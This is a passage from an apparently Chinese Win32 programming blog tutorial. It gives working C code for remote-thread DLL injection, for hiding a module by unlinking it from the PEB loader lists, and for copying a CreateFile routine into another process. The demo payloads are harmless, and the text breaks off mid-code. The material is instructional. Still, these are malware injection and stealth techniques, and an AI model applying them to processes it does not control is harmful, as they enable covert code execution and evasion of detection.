<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 2. 获取DLL文件路径的长度，并在最后+1，因为要加上0结尾的长度</span></span><br><span class="line">	dwLength = <span class="built_in">strlen</span>(szDllPathName) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 3. 在目标进程分配内存  在被注入的进程中分别配一段空间，存储DLL的地址</span></span><br><span class="line">	lpAllocAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwLength, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (lpAllocAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		OutputDebugString(<span class="string">&quot;VirtualAllocEx failed! \n&quot;</span>);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 4. 拷贝DLL路径名字到被注入进程的内存</span></span><br><span class="line">	bRet = WriteProcessMemory(hProcess, lpAllocAddr, reinterpret_cast&lt;LPCVOID&gt;(szDllPathName), dwLength, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!bRet) &#123;</span><br><span class="line">		OutputDebugString(<span class="string">&quot;WriteProcessMemory failed! \n&quot;</span>);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 5. 获取模块句柄</span></span><br><span class="line">	<span class="comment">// LoadLibrary这个函数是在kernel32.dll这个模块中的，所以需要先获取kernel32.dll这个模块的句柄</span></span><br><span class="line">	hModule = GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!hModule) &#123;</span><br><span class="line">		OutputDebugString(<span class="string">&quot;GetModuleHandle failed! \n&quot;</span>);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 6. 获取LoadLibraryA函数地址</span></span><br><span class="line">	dwLoadAddr = reinterpret_cast&lt;DWORD&gt;(GetProcAddress(hModule, <span class="string">&quot;LoadLibraryA&quot;</span>));</span><br><span class="line">	<span class="keyword">if</span> (!dwLoadAddr) &#123;</span><br><span class="line">		OutputDebugString(<span class="string">&quot;GetProcAddress failed! \n&quot;</span>);</span><br><span class="line">		CloseHandle(hModule);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 7. 创建远程线程，加载DLL</span></span><br><span class="line">	hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, reinterpret_cast&lt;LPTHREAD_START_ROUTINE&gt;(dwLoadAddr), lpAllocAddr, <span class="number">0</span>, &amp;dwThreadID);</span><br><span class="line">	<span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line">		OutputDebugString(<span class="string">&quot;CreateRemoteThread failed! \n&quot;</span>); </span><br><span class="line">		DWORD dwError = GetLastError();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateRemoteThread failed with error: %d\n&quot;</span>, dwError);</span><br><span class="line"></span><br><span class="line">		CloseHandle(hModule);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 8. 关闭进程句柄</span></span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">GetProcessIdByName</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* processName)</span> &#123;</span><br><span class="line">	HANDLE hSnap;</span><br><span class="line">	PROCESSENTRY32 pe32;</span><br><span class="line">	DWORD processId = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnap == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed to create snapshot\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">	<span class="keyword">if</span> (!Process32First(hSnap, &amp;pe32)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed to get the first process\n&quot;</span>);</span><br><span class="line">		CloseHandle(hSnap);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(pe32.szExeFile, processName) == <span class="number">0</span>) &#123;</span><br><span class="line">			processId = pe32.th32ProcessID;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!Process32Next(hSnap, &amp;pe32)) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hSnap);</span><br><span class="line">	<span class="keyword">return</span> processId;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过进程名获取进程PID</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span>* processName = <span class="string">&quot;被注入程序.exe&quot;</span>;</span><br><span class="line">	DWORD processId = GetProcessIdByName(processName);</span><br><span class="line">	<span class="keyword">if</span> (processId == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed to find the process\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Process ID: %lu\n&quot;</span>, processId);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 注入DLL</span></span><br><span class="line">	LoadDll(processId, <span class="string">&quot;./远程线程注入dll.dll&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>被注入程序.exe：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disaboe:6031)</span></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;-----%d-----\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注入的DLL：</p>
<p>pch.h头文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PCH_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PCH_H</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加要在此处预编译的标头</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//PCH_H</span></span></span><br></pre></td></tr></table></figure>

<p>dllmain.cpp：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The program is being injected\n&quot;</span>);</span><br><span class="line">        Sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="模块隐藏"><a href="#模块隐藏" class="headerlink" title="模块隐藏"></a>模块隐藏</h2><h3 id="模块隐藏之断链"><a href="#模块隐藏之断链" class="headerlink" title="模块隐藏之断链"></a>模块隐藏之断链</h3><p>TEB(Thread Environment Block线程环境块) ，他记录线程相关的信息，每一个线程都有自己的TEB，<code>FS:[0]</code>是当前线程的TEB。</p>
<p>PEB(Process Environment Block进程环境块)存放进程信息，每个进程都有自己的PEB信息，TEB偏移0x30即当前进程的PEB地址</p>
<p>TEB和PEB都在用户空间</p>
<p><img src="/2024/07/05/Win32API/image-20240320200212614.png" alt="image-20240320200212614"></p>
<p>在OD中使用指令<code>dd [FS]</code>，跳转到TEB的位置：</p>
<p>比如，先打开kernel32.dll的位置，</p>
<p><img src="/2024/07/05/Win32API/image-20240320170850397.png" alt="image-20240320170850397"></p>
<p><img src="/2024/07/05/Win32API/image-20240320191115578.png" alt="image-20240320191115578"></p>
<p><img src="/2024/07/05/Win32API/image-20240320171515791.png" alt="image-20240320171515791"></p>
<p>当API函数遍历模块的时候就是查PEB中的表</p>
<p><img src="/2024/07/05/Win32API/image-20240320171915170.png" alt="image-20240320171915170"></p>
<h3 id="PEB断链原码"><a href="#PEB断链原码" class="headerlink" title="PEB断链原码"></a>PEB断链原码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;        <span class="comment">//字符串长度</span></span><br><span class="line">    USHORT MaximumLength; <span class="comment">//字符串最大长度</span></span><br><span class="line">    PWSTR Buffer;         <span class="comment">//双字节字符串指针</span></span><br><span class="line">&#125; UNICODE_STRING, * PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Length;</span><br><span class="line">    BOOLEAN Initialized;</span><br><span class="line">    PVOID SsHandle;</span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList;           <span class="comment">//代表按加载顺序构成的模块列表</span></span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;         <span class="comment">//代表按内存顺序构成的模块列表</span></span><br><span class="line">    LIST_ENTRY InInitializationOrderModuleList; <span class="comment">//代表按初始化顺序构成的模块链表</span></span><br><span class="line">&#125;PEB_LDR_DATA, * PPEB_LDR_DATA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList;  <span class="comment">//代表按加载顺序构成的模块列表</span></span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;    <span class="comment">//代表按内存顺序构成的模块列表</span></span><br><span class="line">    LIST_ENTRY InInitializeationOrderModuleList; <span class="comment">//代表按初始化顺序构成的模块链表</span></span><br><span class="line">    PVOID DllBase;     <span class="comment">//该模块的基地址</span></span><br><span class="line">    PVOID EntryPoint;  <span class="comment">//该模块的入口</span></span><br><span class="line">    ULONG SizeOfImage; <span class="comment">//该模块的影像大小</span></span><br><span class="line">    UNICODE_STRING FullDllName;    <span class="comment">//模块的完整路径</span></span><br><span class="line">    UNICODE_STRING BaseDllName;    <span class="comment">//模块名</span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    SHORT LoadCount;</span><br><span class="line">    SHORT TlsIndex;</span><br><span class="line">    HANDLE SectionHandle;</span><br><span class="line">    ULONG CheckSum;</span><br><span class="line">    ULONG TimeDataStamp;</span><br><span class="line">&#125;LDR_MODULE, * PLDR_MODULE;</span><br><span class="line"></span><br><span class="line">PEB_LDR_DATA* g_pPebLdr = <span class="literal">NULL</span>;</span><br><span class="line">LDR_MODULE* g_pLdrModule = <span class="literal">NULL</span>;</span><br><span class="line">LIST_ENTRY* g_pInLoadOrderModule;</span><br><span class="line">LIST_ENTRY* g_pInMemoryOrderModule;</span><br><span class="line">LIST_ENTRY* g_pInInitializeationOrderModule;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ring3BrokenChains</span><span class="params">(HMODULE hModule)</span></span><br><span class="line">&#123;</span><br><span class="line">    LIST_ENTRY* pHead = g_pInLoadOrderModule;</span><br><span class="line">    LIST_ENTRY* pCur = pHead;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        pCur = pCur-&gt;Blink;</span><br><span class="line">        g_pLdrModule = (PLDR_MODULE)pCur;  <span class="comment">// 这里为什么可以直接将pCur转为PLDR_MODULE，见下面代码解释</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// CONTAINING_RECORD这个宏返回成员变量所在结构体的基址，ldte == g_pLdrModule</span></span><br><span class="line">        <span class="comment">// PLDR_MODULE ldte = CONTAINING_RECORD(pCur, _LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hModule == g_pLdrModule-&gt;DllBase)</span><br><span class="line">        &#123;</span><br><span class="line">            g_pLdrModule-&gt;InLoadOrderModuleList.Blink-&gt;Flink = g_pLdrModule-&gt;InLoadOrderModuleList.Flink;</span><br><span class="line">            g_pLdrModule-&gt;InLoadOrderModuleList.Flink-&gt;Blink = g_pLdrModule-&gt;InLoadOrderModuleList.Blink;</span><br><span class="line"></span><br><span class="line">            g_pLdrModule-&gt;InInitializeationOrderModuleList.Blink-&gt;Flink = g_pLdrModule-&gt;InInitializeationOrderModuleList.Flink;</span><br><span class="line">            g_pLdrModule-&gt;InInitializeationOrderModuleList.Flink-&gt;Blink = g_pLdrModule-&gt;InInitializeationOrderModuleList.Blink;</span><br><span class="line"></span><br><span class="line">            g_pLdrModule-&gt;InMemoryOrderModuleList.Blink-&gt;Flink = g_pLdrModule-&gt;InMemoryOrderModuleList.Flink;</span><br><span class="line">            g_pLdrModule-&gt;InMemoryOrderModuleList.Flink-&gt;Blink = g_pLdrModule-&gt;InMemoryOrderModuleList.Blink;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (pHead != pCur);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax, fs: [<span class="number">0x30</span>] ;  <span class="comment">// PPEB</span></span><br><span class="line">        mov ecx, [eax + <span class="number">0xC</span>];  <span class="comment">// ldr</span></span><br><span class="line">        mov g_pPebLdr, ecx;</span><br><span class="line"></span><br><span class="line">        mov ebx, ecx;</span><br><span class="line">        add ebx, <span class="number">0xC</span>;</span><br><span class="line">        mov g_pInLoadOrderModule, ebx;              <span class="comment">// 第1个链表</span></span><br><span class="line"></span><br><span class="line">        mov ebx, ecx;</span><br><span class="line">        add ebx, <span class="number">0x14</span>;</span><br><span class="line">        mov g_pInMemoryOrderModule, ebx;            <span class="comment">// 第2个链表</span></span><br><span class="line"></span><br><span class="line">        mov ebx, ecx;</span><br><span class="line">        add ebx, <span class="number">0x1C</span>;</span><br><span class="line">        mov g_pInInitializeationOrderModule, ebx;   <span class="comment">// 第3个链表</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;点任意按键开始断链&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    ring3BrokenChains(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;断链成功\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比如：使用以上函数，将以下几个库都断开</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ring3BrokenChains(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line">ring3BrokenChains(GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>断开前：</p>
<p><img src="/2024/07/05/Win32API/image-20240320205056436.png" alt="image-20240320205056436"></p>
<p>断开后：</p>
<p><img src="/2024/07/05/Win32API/image-20240320205125990.png" alt="image-20240320205125990"></p>
<p>参见：[<a href="https://bbs.kanxue.com/thread-278717.htm">原创]超详细的3环和0环断链隐藏分析-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p>
<h2 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h2><h3 id="代码注入原则"><a href="#代码注入原则" class="headerlink" title="代码注入原则"></a>代码注入原则</h3><p>四种代码不能注入的情况：</p>
<p>&lt;1&gt; 不能有全局变量<br>&lt;2&gt; 不能使用常量字符串<br>&lt;3&gt; 不能使用系统调用<br>&lt;4&gt; 不能嵌套其他函数</p>
<h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><p>有这么多限制该怎么办？假设我们要将代码进程的代码拷贝过去，这段代码的作用就是创建文件，那么它得流程可以如下图所示：</p>
<img src="/2024/07/05/Win32API/image-20240321135504313.png" alt="image-20240321135504313" style="zoom:70%;">

<p>首先将代码进程的ThreadProc复制过去，然后将复制过去之后目标进程的地址给到<strong>CreateRemoteThread</strong>函数，这样就解决了自定义函数的问题；</p>
<p>其次我们要创建文件的话就必须要使用<strong>CreateFile</strong>函数，我们不能直接这样写，因为它依赖当前进程的导入表，当前进程和目标进程导入表的地址肯定是不一样的，<strong>所以不符合复制代码的编写原则</strong>；所以我们可以通过线程函数的参数来解决，我们先将所有用到的目标参数写到一个结构体中复制到目标进程，然后将目标进程结构体的地址作为线程函数的参数。</p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>传递参数进行远程注入代码的实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    DWORD dwCreateAPIAddr;                <span class="comment">// Createfile函数的地址</span></span><br><span class="line">    LPCTSTR lpFileName;                    <span class="comment">// 下面都是CreateFile所需要用到的参数</span></span><br><span class="line">    DWORD dwDesiredAccess;</span><br><span class="line">    DWORD dwShareMode;</span><br><span class="line">    LPSECURITY_ATTRIBUTES lpSecurityAttributes;</span><br><span class="line">    DWORD dwCreationDisposition;</span><br><span class="line">    DWORD dwFlagsAndAttributes;</span><br><span class="line">    HANDLE hTemplateFile;</span><br><span class="line">&#125; CREATEFILE_PARAM;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数指针</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HANDLE</span><span class="params">(WINAPI* PFN_CreateFile)</span> <span class="params">(</span></span><br><span class="line"><span class="params">    LPCTSTR lpFileName,</span></span><br><span class="line"><span class="params">    DWORD dwDesiredAccess,</span></span><br><span class="line"><span class="params">    DWORD dwShareMode,</span></span><br><span class="line"><span class="params">    LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span><br><span class="line"><span class="params">    DWORD dwCreationDisposition,</span></span><br><span class="line"><span class="params">    DWORD dwFlagsAndAttributes,</span></span><br><span class="line"><span class="params">    HANDLE hTemplateFile</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写要复制到目标进程的函数</span></span><br><span class="line">DWORD _stdcall <span class="title function_">CreateFileThreadProc</span><span class="params">(LPVOID lparam)</span></span><br><span class="line">&#123;</span><br><span class="line">    CREATEFILE_PARAM* Gcreate = (CREATEFILE_PARAM*)lparam;</span><br><span class="line">    PFN_CreateFile pfnCreateFile;</span><br><span class="line">    pfnCreateFile = (PFN_CreateFile)Gcreate-&gt;dwCreateAPIAddr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// creatFile结构体全部参数</span></span><br><span class="line">    pfnCreateFile(</span><br><span class="line">        Gcreate-&gt;lpFileName,</span><br><span class="line">        Gcreate-&gt;dwDesiredAccess,</span><br><span class="line">        Gcreate-&gt;dwShareMode,</span><br><span class="line">        Gcreate-&gt;lpSecurityAttributes,</span><br><span class="line">        Gcreate-&gt;dwCreationDisposition,</span><br><span class="line">        Gcreate-&gt;dwFlagsAndAttributes,</span><br><span class="line">        Gcreate-&gt;hTemplateFile</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 远程创建文件</span></span><br><span class="line">BOOL <span class="title function_">RemotCreateFile</span><span class="params">(DWORD dwProcessID, <span class="type">char</span>* szFilePathName)</span></span><br><span class="line">&#123;</span><br><span class="line">    BOOL bRet;</span><br><span class="line">    DWORD dwThread;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwThreadFunSize;</span><br><span class="line">    CREATEFILE_PARAM GCreateFile;</span><br><span class="line">    LPVOID lpFilePathName;</span><br><span class="line">    LPVOID lpRemotThreadAddr;</span><br><span class="line">    LPVOID lpFileParamAddr;</span><br><span class="line">    DWORD dwFunAddr;</span><br><span class="line">    HMODULE hModule;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    bRet = <span class="number">0</span>;</span><br><span class="line">    hProcess = <span class="number">0</span>;</span><br><span class="line">    dwThreadFunSize = <span class="number">0x400</span>;</span><br><span class="line">    <span class="comment">// 1. 获取进程的句柄</span></span><br><span class="line">    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);</span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        OutputDebugString(<span class="string">&quot;OpenProcessError! \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 分配3段内存：存储参数，线程函数，文件名</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.1 用来存储文件名 +1是要计算到结尾处</span></span><br><span class="line">    lpFilePathName = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="built_in">strlen</span>(szFilePathName)+<span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE); <span class="comment">// 在指定的进程中分配内存</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.2 用来存储线程函数</span></span><br><span class="line">    lpRemotThreadAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwThreadFunSize, MEM_COMMIT, PAGE_READWRITE); <span class="comment">// 在指定的进程中分配内存</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.3 用来存储文件参数</span></span><br><span class="line">    lpFileParamAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(CREATEFILE_PARAM), MEM_COMMIT, PAGE_READWRITE); <span class="comment">// 在指定的进程中分配内存</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 初始化CreateFile参数</span></span><br><span class="line">    GCreateFile.dwDesiredAccess = GENERIC_READ | GENERIC_WRITE;</span><br><span class="line">    GCreateFile.dwShareMode = <span class="number">0</span>;</span><br><span class="line">    GCreateFile.lpSecurityAttributes = <span class="literal">NULL</span>;</span><br><span class="line">    GCreateFile.dwCreationDisposition = OPEN_ALWAYS;</span><br><span class="line">    GCreateFile.dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL;</span><br><span class="line">    GCreateFile.hTemplateFile = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 获取CreateFile的地址</span></span><br><span class="line">    <span class="comment">// 因为每个进程中的LoadLibrary函数都在Kernel32.dll中，而且此dll的物理页是共享的，所以我们进程中获得的LoadLibrary地址和别的进程都是一样的</span></span><br><span class="line">    hModule = GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    GCreateFile.dwCreateAPIAddr = (DWORD)GetProcAddress(hModule, <span class="string">&quot;CreateFileA&quot;</span>);</span><br><span class="line">    FreeLibrary(hModule);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 初始化CreatFile文件名</span></span><br><span class="line">    GCreateFile.lpFileName = (LPCTSTR)lpFilePathName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 修改线程函数起始地址</span></span><br><span class="line">    dwFunAddr = (DWORD)CreateFileThreadProc;</span><br><span class="line">    <span class="comment">// 间接跳</span></span><br><span class="line">    <span class="keyword">if</span> (*((BYTE*)dwFunAddr) == <span class="number">0xE9</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dwFunAddr = dwFunAddr + <span class="number">5</span> + *(DWORD*)(dwFunAddr + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 开始复制</span></span><br><span class="line">    <span class="comment">// 7.1 拷贝文件名</span></span><br><span class="line">    WriteProcessMemory(hProcess, lpFilePathName, szFilePathName, <span class="built_in">strlen</span>(szFilePathName) + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7.2 拷贝线程函数</span></span><br><span class="line">    WriteProcessMemory(hProcess, lpRemotThreadAddr, (LPVOID)dwFunAddr, dwThreadFunSize, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7.3 拷贝参数</span></span><br><span 